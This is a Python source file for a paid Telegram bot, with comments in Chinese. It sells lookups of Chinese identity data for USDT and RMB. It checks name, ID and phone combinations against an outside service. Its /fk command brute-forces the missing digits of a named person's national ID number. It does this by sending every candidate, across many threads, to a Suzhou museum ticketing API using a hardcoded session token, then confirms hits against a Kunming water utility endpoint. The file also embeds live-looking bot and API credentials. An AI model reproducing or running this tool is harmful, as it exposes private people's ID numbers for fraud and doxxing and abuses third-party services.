import telebot
import requests
import json
import os
import re
import time
import random
import threading
from datetime import date
from concurrent.futures import ThreadPoolExecutor
from telebot import types

# 屏蔽 SSL 证书报警
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ================= 1. 核心配置 =================
API_TOKEN = '9262592175:AAGxl5ZK77A7trDhdr5Yh4AEgMQ-2J0aX28'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'

bot = telebot.TeleBot(API_TOKEN)
user_points = {}
user_states = {}
success_list = []
list_lock = threading.Lock()

# --- 身份证合法性检查(精确算法) ---
def is_valid_id_data(n):
    if len(n) != 18: return False
    try:
        year, month, day = int(n[6:10]), int(n[10:12]), int(n[12:14])
        if not (1950 <= year <= 2026 and 1 <= month <= 12 and 1 <= day <= 31): return False
    except: return False
    var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
    try:
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17].upper()
    except: return False

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): float(v) for k, v in data.items()}
        except: pass
    return pts

user_points = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)

# --- 授权读取(用于第一轮接口: 博物馆) ---
def get_auth_from_file():
    if not os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, "w", encoding="utf-8") as f:
            f.write("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjEzNDY1OTQyNzY4IiwicGhvbmVJbnZhbGlkIjowLCJuYW1lIjoiMTM0NjU5NDI3NjgiLCJjdXN0b21lcklkIjoiMjNmYTcwMzJiOTRjNDM5Y2E4OTMyMDI2ZjExZGUxNGEiLCJleHAiOjE3OTE1MzY5NjUsIm1kNSI6IjVGMTg3REU3RThEQ0ZCNDUwQTNCNkE5N0RFQjE3M0FBIn0.eBUingIkCJFQeuqjdVvf0Fc0RfGL26LdK_NVHIgvFdU")
    with open(TOKEN_FILE, "r", encoding="utf-8") as f:
        auth = f.read().strip()
        return auth if auth and "请在此处" not in auth else None


# ================= 2. 功能逻辑 =================

def query_3ys_logic(chat_id, name, id_card, phone, uid):
    """三要素核验"""
    wait_msg = bot.send_message(chat_id, "⏳ 正在核验...")
    url = "http://冰封.top/sys.php"
    params = {"name": name, "sfz": id_card, "sjh": phone}
    try:
        response = requests.get(url, params=params, timeout=15, verify=False)
        response.encoding = 'utf-8'
        user_points[uid] -= 0.05
        save_points()
        
        raw_text = response.text.strip()
        # 修正：严谨判断，必须包含成功/一致且不包含不一致/失败
        if ("一致" in raw_text or "成功" in raw_text) and "不一致" not in raw_text and "失败" not in raw_text:
            res_status = "三要素核验成功✅"
        else:
            res_status = "三要素核验失败❌"
        
        bot.delete_message(chat_id, wait_msg.message_id)
        bot.send_message(chat_id, f"<b>姓名:</b> {name}\n"
                                  f"<b>手机号:</b> {phone}\n"
                                  f"<b>身份证:</b> <code>{id_card}</code>\n"
                                  f"<b>结果:</b> {res_status}\n\n"
                                  f"<b>已扣除 0.05 积分!</b>\n"
                                  f"<b>当前余额: {user_points[uid]:.2f} 积分</b>", parse_mode='HTML')
    except Exception as e: 
        bot.edit_message_text(f"⚠️ 核验异常: {str(e)}", chat_id, wait_msg.message_id)

def single_verify_2ys(chat_id, name, id_card, uid):
    """二要素核验"""
    wait_msg = bot.send_message(chat_id, "⏳ 正在进行二要素核验...")
    url = "http://冰封.top/二要素.php"
    params = {"name": name, "sfz": id_card}
    
    try:
        response = requests.get(url, params=params, timeout=15, verify=False)
        response.encoding = 'utf-8'
        
        user_points[uid] -= 0.01
        save_points()
        
        raw_text = response.text.strip()
        # 修正：必须包含“一致”且绝不能包含“不一致”
        if "一致" in raw_text and "不一致" not in raw_text:
            status_title = "二要素核验一致✅"
        else:
            status_title = "二要素核验失败❌"

        result_msg = (
            f"<b>姓名:</b> {name}\n"
            f"<b>身份证:</b> <code>{id_card}</code>\n"
            f"<b>结果:</b> {status_title}\n\n"
            f"<b>已扣除 0.01 积分!</b>\n"
            f"<b>当前余额: {user_points[uid]:.2f} 积分</b>"
        )
        bot.delete_message(chat_id, wait_msg.message_id)
        bot.send_message(chat_id, result_msg, parse_mode='HTML')

    except Exception as e: 
        bot.edit_message_text(f"❌ 请求异常: {str(e)}", chat_id, wait_msg.message_id)


# --- 非库相关爆破与核验逻辑 ---
def verify_museum(id_num, target_name, headers, url):
    payload = {
        "contactName": target_name,
        "contactPhone": "15815067442",
        "documentType": "RLY0101",
        "documentNumber": id_num,
        "isPartyMember": 0, "myself": 0
    }
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=8)
        res_json = response.json()
        if (res_json.get("code") == 200 and res_json.get("data") is True) or ("已存在" in res_json.get("msg", "")):
            return True
        return False
    except: return False

class KunmingWaterVerifier:
    def __init__(self):
        self.url = "https://km96106.cn/mpwxweb/business/authVerify.do"
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781 NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf254162e) XWEB/18151",
            'dataSign': "",
            'appid': "kmwater_2024031200",
            'xweb_xhr': "1",
            'devicetype': "phone",
            'deviceid': "17685697269195111710",
            'platform': "9",
            'Access-Control-Allow-Headers': "x-requested-with,appid,platform,openid,accountid,deviceid,devicetype,preSign,kmwater-extservice-token",
            'Sec-Fetch-Site': "cross-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://servicewechat.com/wxe7e45324b93b190b/32/page-frame.html",
            'Accept-Language': "zh-CN,zh;q=0.9"
        }

    def verify(self, name: str, card_no: str) -> bool:
        payload = {
            'type': "1",
            'name': name.strip(),
            'cardNo': card_no.strip()
        }
        try:
            resp = requests.post(self.url, data=payload, headers=self.headers, timeout=10)
            data = resp.json()
            if data.get("data", {}).get("desc") == "验证通过":
                return True
            return False
        except:
            return False

def verify_task(id_num, target_name, headers, url):
    time.sleep(random.uniform(0.1, 0.3))
    res = verify_museum(id_num, target_name, headers, url)
    with list_lock:
        if res:
            success_list.append(id_num)

def run_fk_process(chat_id, target_name, card_mask, gender, uid):
    global success_list
    success_list = []
    
    bot.send_message(chat_id, f"🔍 正在解析证件掩码组合，准备开始非库检索...")
    
    char_sets = [list("0123456789")] * 18
    for i, ch in enumerate(card_mask):
        if ch != 'x': char_sets[i] = [ch]
        elif i == 17: char_sets[i] = list("0123456789X")
        elif i == 16:
            if gender == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
            elif gender == "女": char_sets[16] = ["0", "2", "4", "6", "8"]

    valid_ids = ["".join(r) for r in itertools.product(*char_sets) if is_valid_id_data("".join(r))]
    
    if not valid_ids:
        bot.send_message(chat_id, "❌ 证件号掩码组合无效或没有符合条件的有效身份证。")
        return

    museum_url = "https://newticket.szmuseum.com/japi/sw-saas-cloud/customerContact/save"
    auth_token = get_auth_from_file()
    if not auth_token:
        bot.send_message(chat_id, "❌ 错误: 未找到有效的 token 配置，请联系管理员更新。")
        return

    headers = {
        "Host": "newticket.szmuseum.com",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68 NetType/WIFI Language/zh_CN",
        "AuthorizationC": auth_token,
        "token": "f3Qu372W6kD3HJzZvKvqy9VNCBZX+/txdZA42yjgQQY=",
        "appId": "9eadb789046543df8b229ae99bb6e8ec"
    }

    bot.send_message(chat_id, f"🚀 有效组合共 {len(valid_ids)} 条，正在进行第一轮多线程初筛...")

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(lambda id_num: verify_task(id_num, target_name, headers, museum_url), valid_ids)

    # 第二轮复核
    if success_list:
        bot.send_message(chat_id, f"📋 初筛发现 {len(success_list)} 个疑似结果，正在启动二次精准复核...")
        verified_final = None
        water_verifier = KunmingWaterVerifier()
        
        for sid in success_list:
            time.sleep(1.0)
            if water_verifier.verify(target_name, sid):
                verified_final = sid
                break
        
        if verified_final:
            result_text = (
                f"━━━ 一铭平安喜樂 ━━━\n"
                f"━━━━━━━━━━━━━━\n"
                f"✅ **非库查询成功**\n"
                f"<b>姓名:</b> {target_name}\n"
                f"<b>身份证:</b> <code>{verified_final}</code>\n"
                f"<b>当前余额:</b> {user_points[uid]:.2f} 积分"
            )
            bot.send_message(chat_id, result_text, parse_mode='HTML')
        else:
            bot.send_message(chat_id, "❌ 初选中的号码均未通过终审。")
    else:
        bot.send_message(chat_id, "❌ 检索结束，未发现匹配结果。")


# ================= 3. UI 菜单 =================

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("使用帮助", callback_data="view_help"), 
        types.InlineKeyboardButton("在线充值", callback_data="view_pay")
    )
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("USDT 充值", url=admin_url), 
        types.InlineKeyboardButton("OkPay 充值", url=admin_url), 
        types.InlineKeyboardButton("RMB 充值", url=admin_url), 
        types.InlineKeyboardButton("🔙 返回主菜单", callback_data="back_to_main")
    )
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 返回主菜单", callback_data="back_to_main"))

def get_main_text(source_user_id, source_first_name, source_username, pts):
    return (f"<b>Admin@铭</b>\n\n"
            f"<b>用户 ID:</b> <code>{source_user_id}</code>\n"
            f"<b>用户名称:</b> {source_first_name}\n"
            f"<b>用户名:</b> {source_username}\n"
            f"<b>当前余额:</b> <code>{pts:.2f}积分</code>\n\n"
            f"<b>使用帮助可查看使用教程</b>\n"
            f"<b>在线充值可支持24小时</b>\n"
            f"<b>1 USDT = 1 积分</b>")

# ================= 4. 消息与回调处理 =================

@bot.message_handler(commands=['start', '3ys', '2ys', 'fk', 'add', 'settoken'])
def handle_commands(message):
    uid, chat_id = message.from_user.id, message.chat.id
    cmd_parts = message.text.split()
    cmd = cmd_parts[0][1:]
    current_pts = user_points.get(uid, 0.0)

    if cmd == 'start':
        if uid not in user_points: user_points[uid] = 0.0
        first_name = message.from_user.first_name or "User"
        username = f"@{message.from_user.username}" if message.from_user.username else "未设置"
        bot.send_message(chat_id, get_main_text(uid, first_name, username, user_points[uid]), parse_mode='HTML', reply_markup=get_main_markup())
    elif cmd == '2ys':
        if current_pts < 0.01: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
        bot.send_message(chat_id, "请输入:姓名 身份证"); user_states[chat_id] = {'step': 'v_2ys'}
    elif cmd == '3ys':
        if current_pts < 0.05: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
        bot.send_message(chat_id, "请输入:姓名 身份证 手机号"); user_states[chat_id] = {'step': 'v_3ys'}
    elif cmd == 'fk':
        if current_pts < 1.0:
            return bot.send_message(chat_id, "<b>❌ 积分不足 1.0，请先充值后再使用非库查询！</b>", parse_mode='HTML')
        
        if len(cmd_parts) < 4:
            return bot.send_message(chat_id, "<b>❌ 格式错误！\n正确格式:</b> <code>/fk 姓名 身份证掩码 性别</code>\n例如: <code>/fk 杨志强 41152420020529xxxx 男</code>", parse_mode='HTML')
        
        target_name = cmd_parts[1]
        card_mask = cmd_parts[2].lower()
        gender = cmd_parts[3]
        
        # 每次扣除 1 积分
        user_points[uid] -= 1.0
        save_points()
        
        bot.send_message(chat_id, f"✅ 已扣除 1 积分，当前剩余: {user_points[uid]:.2f} 积分")
        
        # 开启线程执行非库爆破
        threading.Thread(target=run_fk_process, args=(chat_id, target_name, card_mask, gender, uid)).start()

    elif cmd == 'settoken':
        if uid == ADMIN_ID:
            if len(cmd_parts) < 2:
                return bot.reply_to(message, "❌ 格式错误！正确用法: /settoken <新Token内容>")
            new_token = cmd_parts[1]
            try:
                with open(TOKEN_FILE, "w", encoding="utf-8") as f:
                    f.write(new_token)
                bot.reply_to(message, "✅ Token 更新成功并已保存！")
            except Exception as e:
                bot.reply_to(message, f"❌ 保存 Token 失败: {e}")
        else:
            bot.reply_to(message, "⛔ 您没有权限执行此命令！")

    elif cmd == 'add':
        if uid == ADMIN_ID:
            try:
                target_uid = int(cmd_parts[1])
                add_amount = float(cmd_parts[2])
                user_points[target_uid] = user_points.get(target_uid, 0.0) + add_amount
                save_points()
                bot.reply_to(message, f"✅ 充值成功!\n用户 ID: <code>{target_uid}</code>\n充值金额: {add_amount}\n<b>当前总余额: {user_points[target_uid]:.2f} 积分</b>", parse_mode='HTML')
            except Exception as e: bot.reply_to(message, f"❌ 格式错误:/add 用户ID 金额")
        else: bot.reply_to(message, "⛔ 您没有权限访问此命令!")

@bot.message_handler(func=lambda m: True)
def handle_all_text(message):
    uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
    if text.startswith('/'): return
    current_pts = user_points.get(uid, 0.0)
    
    # 兼容直接输入：姓名 身份证掩码 性别（自动触发非库）
    parts = text.split()
    if len(parts) == 3 and ('x' in parts[1].lower() or len(parts[1]) == 18):
        if current_pts < 1.0:
            return bot.send_message(chat_id, "<b>❌ 积分不足 1.0，请先充值！</b>", parse_mode='HTML')
        
        target_name = parts[0]
        card_mask = parts[1].lower()
        gender = parts[2]
        
        user_points[uid] -= 1.0
        save_points()
        bot.send_message(chat_id, f"✅ 已扣除 1 积分，当前剩余: {user_points[uid]:.2f} 积分")
        
        threading.Thread(target=run_fk_process, args=(chat_id, target_name, card_mask, gender, uid)).start()
        return

    parts = re.split(r'[,,\s\n]+', text)
    
    if len(parts) >= 3:
        n, p, i = None, None, None
        for x in parts:
            if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
            elif not p and re.match(r'^1[3-9]\d{9}$', x): p = x
            elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
        if n and p and i:
            if current_pts < 0.05: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
            return query_3ys_logic(chat_id, n, i, p, uid)
            
    if len(parts) == 2:
        n, i = None, None
        for x in parts:
            if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
            elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
        if n and i:
            if current_pts < 0.01: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
            return single_verify_2ys(chat_id, n, i, uid)
    
    bot.send_message(chat_id, "⚠️ 运行异常或无法识别您的输入,请发送 /start 查看可用功能。")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    
    uid = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    pts = user_points.get(uid, 0.0)
    first_name = call.from_user.first_name or "User"
    username = f"@{call.from_user.username}" if call.from_user.username else "未设置"
    
    try:
        if call.data == "view_help":
            # 原版帮助文本完全保持不变，仅在下方原样追加了 /fk 非库说明
            help_text = (
                "<b>🛠️ 使用帮助</b>\n"
                "<b>名字-身份证核验 (企业级)</b>\n"
                "<b>全天 24h 秒出 毫秒级响应</b>\n"
                "<b>发送 /2ys 进行核验</b>\n"
                "<b>每次核验扣除 0.01 积分</b>\n"
                "<b>——————————————————</b>\n"
                "<b>名字-手机号-身份证核验 (企业级)</b>\n"
                "<b>全天 24h 秒出 毫秒级响应</b>\n"
                "<b>发送 /3ys 进行核验</b>\n"
                "<b>每次核验扣除 0.05 积分</b>\n"
                "<b>——————————————————</b>\n"
                "<b>非库身份证模糊匹配 (新功能)</b>\n"
                "<b>发送 /fk 姓名 身份证掩码 性别 进行查询</b>\n"
                "<b>每次查询扣除 1 积分</b>"
            )
            bot.edit_message_text(help_text, chat_id, message_id, reply_markup=get_help_markup(), parse_mode='HTML')
        elif call.data == "view_pay":
            pay_text = "🛍️ <b>请选择充值方式:</b>\n<b>1 USDT = 1 积分</b>"
            bot.edit_message_text(pay_text, chat_id, message_id, reply_markup=get_pay_markup(), parse_mode='HTML')
        elif call.data == "back_to_main":
            bot.edit_message_text(get_main_text(uid, first_name, username, pts), chat_id, message_id, parse_mode='HTML', reply_markup=get_main_markup())
    except Exception as e:
        pass

if __name__ == '__main__':
    print("Bot 正在运行...")
    try:
        bot.remove_webhook()
    except Exception as e:
        print(f"清除 webhook 警告: {e}")
        
    bot.infinity_polling(timeout=10, long_polling_timeout=5, interval=1)
